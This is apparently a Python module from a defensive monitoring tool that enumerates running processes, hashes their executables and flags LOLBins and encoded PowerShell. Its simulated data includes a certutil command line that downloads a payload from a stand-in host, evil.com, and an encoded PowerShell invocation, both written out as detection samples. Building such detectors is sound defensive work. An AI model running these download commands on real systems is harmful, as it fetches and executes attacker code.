"""
KAVACH Process Collector.

Collects running process information including:
- PID, PPID, user, command line, status
- CPU/memory usage
- File hashes (SHA256, MD5) of executables
- LOLBin detection
- Suspicious behaviour flags
"""

from __future__ import annotations

import asyncio
import hashlib
import os
import random
import socket
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from collectors.base import BaseCollector, TelemetryEvent
from core.constants import (
    CollectorName,
    EventType,
    Severity,
    LOLBINS,
    SUSPICIOUS_EXTENSIONS,
)
from core.logging import get_logger

logger = get_logger(__name__)


class ProcessCollector(BaseCollector):
    """Collects detailed process telemetry from the operating system."""

    name = CollectorName.PROCESS
    description = "Running process enumeration with hashes, parent/child trees, and LOLBin detection"

    # Class-level cache for binary hashes to avoid re-reading files on every interval
    _HASH_CACHE: dict[str, dict[str, str]] = {}

    def __init__(self) -> None:
        super().__init__()
        self._known_processes: dict[int, dict[str, Any]] = {}
        self._is_first_scan = True

    def _enumerate_processes_sync(self) -> list[TelemetryEvent]:
        """
        Synchronous process scanner running in worker thread.
        Implements baseline establish + delta tracking from SOC platform architecture.
        """
        import psutil  # type: ignore[import-untyped]

        current_processes: dict[int, dict[str, Any]] = {}
        events: list[TelemetryEvent] = []

        for proc in psutil.process_iter(
            ["pid", "ppid", "name", "username", "cmdline", "exe",
             "status", "create_time", "cpu_percent", "memory_info",
             "num_threads"]
        ):
            try:
                info = proc.info
                pid = info["pid"]
                exe_path = info.get("exe") or ""
                proc_name = (info.get("name") or "").lower()
                cmdline = info.get("cmdline") or []
                cmdline_str = " ".join(cmdline) if cmdline else ""

                current_processes[pid] = {
                    "pid": pid,
                    "ppid": info.get("ppid") or 0,
                    "name": info.get("name") or "unknown",
                    "proc_name_lower": proc_name,
                    "username": info.get("username") or "SYSTEM",
                    "exe": exe_path,
                    "cmdline": cmdline_str,
                    "status": info.get("status"),
                    "create_time": info.get("create_time"),
                    "cpu_percent": info.get("cpu_percent", 0.0),
                    "memory_info": info.get("memory_info"),
                    "num_threads": info.get("num_threads", 0),
                }
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue

        # 1. On first run: establish baseline, only emit if high-severity LOLBin/anomaly present
        if self._is_first_scan:
            self._known_processes = current_processes
            self._is_first_scan = False
            logger.info("process_baseline_established", total_processes=len(current_processes))
            # Scan baseline for any immediate high-threat commands (encoded powershell, etc.)
            for pid, pdata in current_processes.items():
                if pdata["proc_name_lower"] in ("powershell.exe", "pwsh.exe") and any(
                    flag in pdata["cmdline"].lower() for flag in ["-enc", "-encodedcommand", "-e "]
                ):
                    events.append(self._create_process_event(pdata, EventType.PROCESS_CREATE, Severity.HIGH, 75.0, ["encoded_command"]))
            return events

        # 2. Detect New Processes (present in current but not in known)
        new_pids = set(current_processes.keys()) - set(self._known_processes.keys())
        for pid in new_pids:
            pdata = current_processes[pid]
            is_lolbin = pdata["proc_name_lower"] in LOLBINS
            severity = Severity.INFO
            risk = 0.0
            tags: list[str] = []

            if is_lolbin:
                severity = Severity.MEDIUM
                risk = 45.0
                tags.append("lolbin")

            if pdata["proc_name_lower"] in ("powershell.exe", "pwsh.exe") and any(
                flag in pdata["cmdline"].lower() for flag in ["-enc", "-encodedcommand", "-e "]
            ):
                severity = Severity.HIGH
                risk = 75.0
                tags.append("encoded_command")

            events.append(self._create_process_event(pdata, EventType.PROCESS_CREATE, severity, risk, tags))

        # 3. Detect Terminated Processes
        dead_pids = set(self._known_processes.keys()) - set(current_processes.keys())
        for pid in dead_pids:
            pdata = self._known_processes[pid]
            events.append(self._create_process_event(pdata, EventType.PROCESS_TERMINATE, Severity.INFO, 0.0, ["process_terminated"]))

        # Update cache
        self._known_processes = current_processes
        if events:
            logger.debug("processes_delta_collected", new=len(new_pids), terminated=len(dead_pids))
        return events

    def _create_process_event(
        self,
        pdata: dict[str, Any],
        event_type: EventType,
        severity: Severity,
        risk: float,
        tags: list[str],
    ) -> TelemetryEvent:
        exe_path = pdata.get("exe") or ""
        hashes: dict[str, str] = {}
        if exe_path and exe_path in self._HASH_CACHE:
            hashes = self._HASH_CACHE[exe_path]
        elif exe_path and os.path.isfile(exe_path):
            try:
                if os.path.getsize(exe_path) < 25 * 1024 * 1024:
                    hashes = self._compute_hashes(exe_path)
                    self._HASH_CACHE[exe_path] = hashes
            except (PermissionError, OSError):
                pass

        mem = pdata.get("memory_info")
        memory_rss = mem.rss if mem else 0

        return self._create_event(
            event_type,
            severity=severity.value,
            risk_score=risk,
            username=pdata.get("username"),
            tags=tags,
            metadata={
                "pid": pdata["pid"],
                "ppid": pdata.get("ppid"),
                "name": pdata.get("name"),
                "exe": exe_path,
                "cmdline": pdata.get("cmdline", ""),
                "status": pdata.get("status"),
                "create_time": (
                    datetime.fromtimestamp(pdata["create_time"], tz=timezone.utc).isoformat()
                    if pdata.get("create_time")
                    else None
                ),
                "cpu_percent": pdata.get("cpu_percent", 0.0),
                "memory_rss": memory_rss,
                "num_threads": pdata.get("num_threads", 0),
                "hashes": hashes,
                "is_lolbin": "lolbin" in tags,
            },
        )

    async def _collect_real(self) -> list[TelemetryEvent]:
        """Collect real process data off-thread to ensure 100% responsive event loop."""
        return await asyncio.to_thread(self._enumerate_processes_sync)

    async def _collect_simulated(self) -> list[TelemetryEvent]:
        """Generate simulated process data."""
        simulated_processes = [
            {
                "pid": 4, "ppid": 0, "name": "System",
                "exe": "C:\\Windows\\System32\\ntoskrnl.exe",
                "cmdline": "", "username": "SYSTEM",
                "status": "running", "cpu_percent": 0.5,
                "memory_rss": 142_000_000, "is_lolbin": False,
            },
            {
                "pid": 1024, "ppid": 700, "name": "svchost.exe",
                "exe": "C:\\Windows\\System32\\svchost.exe",
                "cmdline": "svchost.exe -k netsvcs -p",
                "username": "NT AUTHORITY\\SYSTEM",
                "status": "running", "cpu_percent": 1.2,
                "memory_rss": 45_000_000, "is_lolbin": False,
            },
            {
                "pid": 5678, "ppid": 1024, "name": "powershell.exe",
                "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "cmdline": "powershell.exe -EncodedCommand SQBFAFgA",
                "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 15.0,
                "memory_rss": 90_000_000, "is_lolbin": True,
            },
            {
                "pid": 3456, "ppid": 1024, "name": "explorer.exe",
                "exe": "C:\\Windows\\explorer.exe",
                "cmdline": "explorer.exe", "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 2.0,
                "memory_rss": 75_000_000, "is_lolbin": False,
            },
            {
                "pid": 7890, "ppid": 5678, "name": "certutil.exe",
                "exe": "C:\\Windows\\System32\\certutil.exe",
                "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
                "username": "DESKTOP-USER\\admin",
                "status": "running", "cpu_percent": 5.0,
                "memory_rss": 20_000_000, "is_lolbin": True,
            },
        ]

        events: list[TelemetryEvent] = []
        for proc in simulated_processes:
            name_lower = proc["name"].lower()
            is_lolbin = name_lower in LOLBINS
            severity = Severity.INFO
            risk = 0.0
            tags: list[str] = ["simulated"]

            if is_lolbin:
                severity = Severity.MEDIUM
                risk = 45.0
                tags.append("lolbin")

            cmdline = proc.get("cmdline", "")
            if name_lower in ("powershell.exe", "pwsh.exe") and "-encodedcommand" in cmdline.lower():
                severity = Severity.HIGH
                risk = 75.0
                tags.append("encoded_command")

            if "certutil" in name_lower and "urlcache" in cmdline.lower():
                severity = Severity.HIGH
                risk = 80.0
                tags.append("suspicious_download")

            event = self._create_event(
                EventType.PROCESS_CREATE,
                severity=severity.value,
                risk_score=risk,
                username=proc.get("username"),
                tags=tags,
                metadata={
                    "pid": proc["pid"],
                    "ppid": proc["ppid"],
                    "name": proc["name"],
                    "exe": proc["exe"],
                    "cmdline": cmdline,
                    "status": proc["status"],
                    "cpu_percent": proc["cpu_percent"],
                    "memory_rss": proc["memory_rss"],
                    "is_lolbin": is_lolbin,
                    "hashes": {
                        "sha256": hashlib.sha256(proc["name"].encode()).hexdigest(),
                        "md5": hashlib.md5(proc["name"].encode()).hexdigest(),
                    },
                },
            )
            events.append(event)

        return events

    @staticmethod
    def _compute_hashes(filepath: str) -> dict[str, str]:
        """Compute SHA256 and MD5 of a file."""
        sha256 = hashlib.sha256()
        md5 = hashlib.md5()
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
                md5.update(chunk)
        return {"sha256": sha256.hexdigest(), "md5": md5.hexdigest()}
